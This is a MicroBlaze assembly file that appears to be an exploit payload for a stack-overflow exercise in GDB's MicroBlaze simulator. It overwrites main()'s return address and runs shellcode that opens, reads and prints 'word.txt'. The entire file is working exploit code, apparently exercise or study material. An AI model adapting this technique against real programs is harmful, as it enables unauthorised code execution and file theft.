/*
 * Write operation is not implemented on MicroBlaze simulator in GDB.
 * See gdb/sim/microblaze/interp.c:process_stub(),handle_trap1()
 * (handle_trap1() is empty function)
 * And printf utility is not implemented too.
 * See gdb/sim/microblaze/interp.c:util() (case 1:)
 */

	.org	0x1c10 - 284 - 44 + 28

	.section .text

	.globl	_start
	.type	_start, @function
_start:
	.long	0x61626364
	.long	0
	.long	0
	.long	0

/* The return address from rtsd instrunction is added immediate value */
#define RSTD_OFFSET 8

	/*
	 * The return address from proc() is lower than buffer,
	 * cannot overwrite it. Overwrite the return address from main().
	 */
	.long	_code - RSTD_OFFSET /* return address from main() */

_code:
	addik	r1, r0, _start

	/*
	 * SYSCALL NO: *SP
	 * ARG1-3: *(SP+4),*(SP+8),*(SP+12)
	 * RETVAL: R3
	 * ERRCODE: -
	 */

#define BRK_SYSCALL_READ  3
#define BRK_SYSCALL_WRITE 4
#define BRK_SYSCALL_OPEN  5
#define BRK_SYSCALL_CLOSE 6

__open:
	addik	r5, r0, _fname
	addik	r6, r0, 0
	addik	r7, r0, 0
	addik	r3, r0, BRK_SYSCALL_OPEN
	swi	r3, r1, 0
	swi	r5, r1, 4
	swi	r6, r1, 8
	swi	r7, r1, 12
	addk	r5, r1, r0
	brk	r3, r5

__read:
	addk	r5, r0, r3
	addik	r6, r0, _buffer
	addik	r7, r0, 32
	addik	r3, r0, BRK_SYSCALL_READ
	swi	r3, r1, 0
	swi	r5, r1, 4
	swi	r6, r1, 8
	swi	r7, r1, 12
	addk	r5, r1, r0
	brk	r3, r5

_save_size:
	addk	r8, r0, r3

__write:
	addik	r5, r0, 1
	addik	r6, r0, _buffer
	addk	r7, r0, r8
	addik	r3, r0, BRK_SYSCALL_WRITE
	swi	r3, r1, 0
	swi	r5, r1, 4
	swi	r6, r1, 8
	swi	r7, r1, 12
	addk	r5, r1, r0
	brk	r3, r5

__exit:
	addik	r3, r0, 0
	/*
	 * Use halt instruction.
	 * See gdb/sim/microblaze/interp.c:sim_resume()
	 * (MICROBLAZE_HALT_INST, SIGQUIT)
	 * Exit code is by r3.
	 * See gdb/sim/microblaze/interp.c:sim_stop_reason() (RETREG)
	 */
	.long	0xb8000000

_fname:	.string	"word.txt"

	.align 2
_code_end:

_buffer:
	.space	32
